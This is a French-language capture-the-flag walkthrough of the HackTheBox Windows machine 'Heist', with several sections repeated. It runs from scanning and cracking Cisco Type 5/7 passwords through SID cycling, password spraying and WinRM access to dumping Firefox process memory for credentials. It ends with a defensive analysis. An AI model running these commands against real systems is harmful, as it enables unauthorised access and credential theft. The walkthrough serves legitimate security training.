![Cover](cover.png)

### Phase 1 : Reconnaissance & Brèche Initiale

L'objectif de cette phase est de cartographier la surface d'attaque de la machine **Heist** et d'exploiter des informations fuitées pour obtenir un premier point d'ancrage sur le système via **WinRM**.

#### 1. Énumération des Services (Scanning)

Je débute par un scan **Nmap** complet pour identifier les ports ouverts et les services associés.

```bash
# Scan rapide de tous les ports TCP
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.149

# Scan détaillé des services identifiés
nmap -sC -sV -p 80,135,445,5985,49669 -oA scans/nmap-tcpscripts 10.10.10.149
```

**Résultats clés :**
*   **Port 80 (HTTP) :** Microsoft IIS 10.0 (indique potentiellement Windows Server 2016/2019).
*   **Port 135/49669 (RPC) :** Microsoft Windows RPC.
*   **Port 445 (SMB) :** Microsoft-ds.
*   **Port 5985 (WinRM) :** Windows Remote Management (vecteur potentiel de shell).

#### 2. Énumération Web & Fuite de Configuration

En naviguant sur le port 80, je tombe sur une page de **Support Login**. L'accès en tant que "Guest" est autorisé et me redirige vers une interface de gestion d'incidents (**Issues page**). Un ticket posté par l'utilisateur **hazard** contient une pièce jointe : un fichier de configuration **Cisco IOS**.

Le fichier révèle trois hashs de mots de passe et des noms d'utilisateurs potentiels :
*   `enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91` (**Cisco Type 5** - MD5)
*   `username rout3r password 7 0242114B0E143F015F5D1E161713` (**Cisco Type 7** - XOR propriétaire)
*   `username admin password 7 02375012182C1A1D751618034F36415408` (**Cisco Type 7**)

#### 3. Analyse et Crackage des Identifiants

Je procède au déchiffrement des hashs pour constituer une liste de credentials.

*   **Cisco Type 5 :** Utilisant **John the Ripper** avec la wordlist `rockyou.txt`.
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash_type5.txt
# Résultat : stealth1agent
```

*   **Cisco Type 7 :** Ce format est réversible car il utilise un algorithme de chiffrement faible basé sur une clé statique. J'utilise un script Python pour extraire le texte clair.
```python
# Logique de déchiffrement Type 7
# Clé statique : "tfd;kfoA,.iyewrkldJKD"
# Résultat 1 : $uperP@ssword
# Résultat 2 : Q4)sJu\Y8qz*A3?d
```

**Inventaire des credentials :**
*   **Users :** `hazard`, `admin`, `rout3r`
*   **Passwords :** `stealth1agent`, `$uperP@ssword`, `Q4)sJu\Y8qz*A3?d`

> **Schéma Mental :**
> L'attaquant exploite une mauvaise configuration web (accès Guest) pour récupérer des fichiers de configuration réseau. Ces fichiers contiennent des hashs obsolètes (Type 7) ou crackables (Type 5), permettant de construire une base de données d'identifiants pour des attaques par **Password Spraying** sur les services d'authentification Windows (SMB/RPC/WinRM).

#### 4. Énumération RPC & SID Cycling

Je teste la validité des identifiants sur le service **SMB** via **CrackMapExec**.

```bash
crackmapexec smb 10.10.10.149 -u users.txt -p passwords.txt
```
L'utilisateur `hazard:stealth1agent` est valide mais n'a accès qu'au partage **IPC$**. Bien que limité, ce partage permet d'interroger le service **LSA** (Local Security Authority) via **rpcclient**.

Je réalise un **SID Cycling** pour énumérer tous les utilisateurs du domaine/machine.

```bash
# Utilisation de lookupsid.py d'Impacket
lookupsid.py hazard:stealth1agent@10.10.10.149
```

**Nouveaux utilisateurs identifiés :**
*   `support` (SID 1009)
*   `Chase` (SID 1012)
*   `Jason` (SID 1013)

#### 5. Brèche Initiale via WinRM

Avec cette nouvelle liste d'utilisateurs, je relance une attaque par dictionnaire sur le service **WinRM** (port 5985).

```bash
# Tentative de connexion avec Evil-WinRM
ruby evil-winrm.rb -i 10.10.10.149 -u chase -p 'Q4)sJu\Y8qz*A3?d'
```

L'authentification réussit pour l'utilisateur **chase**. J'obtiens un shell interactif **PowerShell**, ce qui me permet de récupérer le premier flag.

```powershell
*Evil-WinRM* PS C:\Users\Chase\Desktop> type user.txt
```

---

### Énumération Interne & Vecteurs d'Accès

Après avoir extrait des identifiants d'une configuration Cisco (Type 5 et Type 7), je dispose d'une liste de candidats potentiels pour l'authentification. L'objectif est de valider ces derniers contre les services actifs, notamment **SMB** et **WinRM**.

```bash
# Validation des credentials avec CrackMapExec
crackmapexec smb 10.10.10.149 -u users.txt -p passwords.txt

# Résultat : SUPPORTDESK\hazard:stealth1agent (Accès IPC$ uniquement)
```

L'utilisateur `hazard` n'a pas de droits sur les partages de fichiers classiques mais peut interagir avec le partage **IPC$** (**Inter-Process Communication**). Ce partage est un vecteur privilégié pour l'énumération de comptes via des appels **RPC**.

> **Schéma Mental : Énumération par SID Brute-forcing**
> L'accès au partage **IPC$** permet d'interroger le **SAM** (Security Account Manager) distant. En itérant sur les **RID** (Relative Identifiers) à la fin du **SID** (Security Identifier) de la machine, on peut forcer le système à révéler les noms d'utilisateurs associés, même sans accès administratif.

```bash
# Énumération des utilisateurs via lookupsid.py (Impacket)
lookupsid.py hazard:stealth1agent@10.10.10.149

# Utilisateurs découverts :
# 500: Administrator
# 1008: Hazard
# 1009: support
# 1012: Chase
# 1013: Jason
```

### Mouvement Latéral : Accès WinRM

Avec cette nouvelle liste d'utilisateurs, je procède à un **Password Spraying** ciblé. Le service **WinRM** (port 5985) est ouvert, ce qui permet d'obtenir un shell **PowerShell** distant si les identifiants sont valides.

```bash
# Tentative de connexion WinRM pour l'utilisateur Chase
evil-winrm -i 10.10.10.149 -u chase -p 'Q4)sJu\Y8qz*A3?d'
```

L'authentification réussit pour `chase`. Je récupère le premier flag dans `C:\Users\Chase\Desktop\user.txt`.

---

### Escalade de Privilèges : Analyse de la mémoire Processus

L'énumération locale du répertoire personnel de `chase` révèle un fichier `todo.txt` indiquant que l'utilisateur consulte régulièrement la liste des tickets de support. Une vérification des processus actifs montre que plusieurs instances de **Firefox** sont en cours d'exécution.

> **Schéma Mental : Extraction de secrets du Process Memory**
> Lorsqu'un utilisateur saisit des identifiants dans un formulaire Web, ces données transitent en clair dans la mémoire vive du processus du navigateur avant d'être chiffrées ou envoyées. En effectuant un **Memory Dump** du processus `firefox.exe`, il est possible de retrouver des chaînes de caractères correspondant à des requêtes **HTTP POST** contenant des mots de passe.

#### Méthode 1 : Dump manuel avec Procdump
J'utilise **Procdump** (Suite Sysinternals) pour capturer l'état de la mémoire d'un processus Firefox.

```powershell
# Identification du PID de Firefox
Get-Process firefox

# Création du dump mémoire (PID 6252 par exemple)
.\procdump64.exe -ma 6252 -accepteula firefox.dmp
```

Une fois le fichier `.dmp` rapatrié sur ma machine d'attaque, j'utilise `grep` avec une **Regular Expression** (Regex) pour isoler les paramètres de connexion typiques d'un formulaire de login.

```bash
# Recherche de patterns de login dans le dump binaire
grep -aoE 'login_username=.{1,20}@.{1,20}&login_password=.{1,50}&login=' firefox.dmp

# Résultat : login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
```

#### Méthode 2 : Automatisation avec MimiKittenz
Il est également possible d'utiliser le script PowerShell **MimiKittenz**, qui automatise la lecture de la mémoire des processus utilisateur pour y chercher des secrets via des signatures prédéfinies.

```powershell
# Import et exécution de MimiKittenz (après modification du script pour cibler Heist)
Import-Module .\Invoke-mimikittenz.ps1
Invoke-mimikittenz
```

### Accès Final (Administrator)

Le mot de passe extrait de la mémoire de Firefox (`4dD!5}x/re8]FBuZ`) correspond au hash SHA256 trouvé précédemment dans le code source de `login.php`. Par une pratique courante de **Password Reuse**, ce mot de passe est testé avec succès pour le compte **Administrator** local de la machine.

```bash
# Connexion finale en tant qu'administrateur
evil-winrm -i 10.10.10.149 -u administrator -p '4dD!5}x/re8]FBuZ'
```

L'accès est total, permettant la récupération du flag `root.txt` dans le profil de l'administrateur.

---

### Phase 3 : Élévation de Privilèges & Domination

Une fois l'accès initial établi en tant que **chase**, mon objectif est d'identifier des vecteurs permettant d'atteindre le groupe **Administrators**. L'énumération locale révèle rapidement une activité utilisateur inhabituelle et une mauvaise hygiène de gestion des secrets.

#### 1. Énumération des artefacts et processus
En inspectant le bureau de l'utilisateur, je trouve un fichier `todo.txt` indiquant que `chase` doit vérifier régulièrement la liste des tickets de support. Parallèlement, l'examen des processus actifs montre plusieurs instances de **Firefox** en cours d'exécution.

```powershell
# Liste des processus Firefox actifs
Get-Process firefox

# Lecture du fichier de tâches
type C:\Users\chase\Desktop\todo.txt
```

> **Schéma Mental :** L'utilisateur `chase` est actif et utilise **Firefox** pour consulter une application de support. Puisque les formulaires **HTTP POST** transitent en clair dans la mémoire du processus (ou y restent après soumission), un **Memory Dump** du processus `firefox.exe` permet d'extraire des identifiants sensibles. Cette technique ne nécessite pas de privilèges **SYSTEM**, car je possède déjà les droits de l'utilisateur propriétaire du processus.

#### 2. Extraction de secrets via Memory Forensics
Je décide de dumper la mémoire de l'un des processus Firefox pour y rechercher des chaînes de caractères liées à l'authentification de l'application web de support (identifiée en Phase 1).

J'utilise **procdump64.exe** (de la suite Sysinternals) pour générer le dump, puis je rapatrie le fichier pour une analyse hors-ligne.

```powershell
# Création du dump mémoire d'un PID Firefox (ex: 6252)
.\procdump64.exe -ma 6252 -accepteula firefox_dump.dmp
```

Sur ma machine d'attaque, j'utilise **grep** avec une **Regular Expression (Regex)** ciblée sur le format des requêtes **POST** observé précédemment sur la page `login.php`.

```bash
# Recherche de patterns de login dans le dump binaire
grep -aoE 'login_username=.{1,20}@.{1,20}&login_password=.{1,50}&login=' firefox_dump.dmp
```

**Résultat :** L'extraction révèle les identifiants `admin@support.htb` avec le mot de passe `4dD!5}x/re8]FBuZ`.

#### 3. Domination Totale (Root)
Une vulnérabilité classique en environnement Windows est la **Credential Reuse** (réutilisation de mots de passe). Je teste si le mot de passe de l'administrateur de l'application web est identique à celui du compte **Administrator** local de la machine via **WinRM**.

```bash
# Connexion finale via Evil-WinRM
ruby evil-winrm.rb -i 10.10.10.149 -u Administrator -p '4dD!5}x/re8]FBuZ'
```

La connexion réussit, m'octroyant un shell avec les privilèges les plus élevés sur le système.

---

### Analyse Post-Exploitation "Beyond Root"

L'analyse de la compromission de **Heist** met en évidence plusieurs failles structurelles :

1.  **Hardcoded Credentials & Weak Hashing :** Le fichier `login.php` contenait un mot de passe administrateur codé en dur. Bien que haché en **SHA256**, l'absence de **Salt** et la réutilisation de ce même mot de passe pour le compte système ont rendu la compromission triviale une fois le secret extrait de la mémoire.
2.  **Memory Hygiene :** Les navigateurs web comme **Firefox** conservent des données sensibles (formulaires, cookies, mots de passe saisis) dans l'espace mémoire utilisateur. Un attaquant ayant compromis un compte standard peut effectuer un **Process Injection** ou un **Memory Dump** pour pivoter verticalement sans exploiter de vulnérabilité noyau (Kernel Exploit).
3.  **Cisco Type 7 Vulnerability :** La phase initiale a reposé sur l'extraction de mots de passe depuis une configuration Cisco. L'utilisation de l'algorithme **Type 7** est une faute grave, car il s'agit d'un chiffrement réversible (XOR avec une clé statique) et non d'un hachage sécurisé.
4.  **Information Leakage via RPC :** L'accès en lecture à l'**IPC$** a permis une énumération précise des utilisateurs via **SID Brute Forcing** (`lookupsids`), facilitant grandement les attaques par **Password Spraying**.